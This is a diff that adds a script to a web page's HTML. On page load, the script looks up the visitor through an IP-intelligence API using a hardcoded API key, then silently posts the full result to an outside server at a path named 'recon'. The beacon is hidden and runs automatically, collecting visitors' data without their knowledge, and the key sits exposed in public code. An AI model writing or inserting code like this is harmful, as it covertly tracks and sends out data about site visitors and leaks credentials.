@@ -105,6 +105,37 @@
 
   gtag('config', 'G-SW34D6L9MH');
 </script>
+      <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            // Replace with your API key
+            const apiKey = "f7MbyXpR0DB4eZ2OCmsDOkrXcWTgvA8KZN5zs92xeX6gQcSTIZnlTSlh8U7o";
+
+            // Make an HTTP POST request to get IP address
+            fetch("https://api.criminalip.io/v1/ip/data", {
+                method: "POST",
+                headers: {
+                    "Authorization": `Bearer ${apiKey}`,
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({})
+            })
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip; // Extract the IP address from the response
+                document.getElementById("ipDisplay").textContent = `IP Address: ${ipAddress}`;
+
+                // Send the JSON response to another server (without CORS headers)
+                const xhr = new XMLHttpRequest();
+                xhr.open("POST", "https://static.blitzd.uk:1880/data/recon", true);
+                xhr.setRequestHeader("Content-Type", "application/json");
+                xhr.send(JSON.stringify(data));
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                document.getElementById("ipDisplay").textContent = "Failed to retrieve IP address";
+            });
+        });
+    </script>
 </div>
   </body>
 </html>
